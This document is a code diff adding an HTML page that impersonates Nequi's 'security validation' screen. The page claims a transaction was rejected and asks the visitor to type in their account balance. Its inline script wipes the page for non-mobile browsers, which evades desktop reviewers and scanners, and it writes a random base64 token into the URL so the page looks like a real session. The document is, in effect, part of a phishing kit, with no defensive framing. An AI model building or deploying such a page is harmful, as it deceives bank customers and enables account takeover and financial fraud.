@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Validación de Seguridad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Black overlay background to match image style -->
+    <div class="overlay-container">
+        <div class="modal-card">
+            <!-- Icon -->
+            <div class="hand-icon-container">
+                <i class="far fa-hand-point-up"></i>
+            </div>
+
+            <!-- Title -->
+            <h2 class="modal-title">Queremos validar que eres tú</h2>
+
+            <!-- Description -->
+            <p class="modal-description">
+                Por tu seguridad, rechazamos tu transacción. Para validar que si eres tú el que está haciendo la operación, ingresa el saldo actual de tu cuenta Nequi.
+            </p>
+
+            <!-- Nequi Card Visual -->
+            <div class="nequi-card-visual">
+                <div class="card-header">
+                    <div class="user-info">
+                        <div class="user-avatar"><i class="far fa-user"></i></div>
+                        <span>Hola,</span>
+                    </div>
+                    <div class="card-icons">
+                        <i class="far fa-bell"></i>
+                        <i class="far fa-question-circle"></i>
+                        <i class="fas fa-lock"></i>
+                    </div>
+                </div>
+                
+                <div class="card-body">
+                    <div class="account-type">Cuenta de Ahorros <i class="far fa-eye"></i></div>
+                    <div class="main-balance">$ *****</div>
+                    <div class="total-balance">Total $ *****</div>
+                    <div class="tu-plata-badge">Tu plata <i class="fas fa-chevron-down"></i></div>
+                </div>
+            </div>
+
+            <!-- Input -->
+            <div class="balance-input-container">
+                <span class="currency-symbol">$</span>
+                <input type="tel" id="balance-input" class="balance-input" placeholder="Ingresa tu saldo" inputmode="numeric">
+            </div>
+
+            <!-- Button -->
+            <button id="send-balance-btn" class="pink-btn">Listo</button>
+        </div>
+    </div>
+
+    <!-- Error Alert -->
+    <div id="error-alert" class="error-alert">
+        <i class="fas fa-exclamation-circle" style="margin-right: 8px;"></i>
+        Saldo incorrecto
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Validando...</div>
+    </div>
+
+    <script src="saldo.js"></script>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
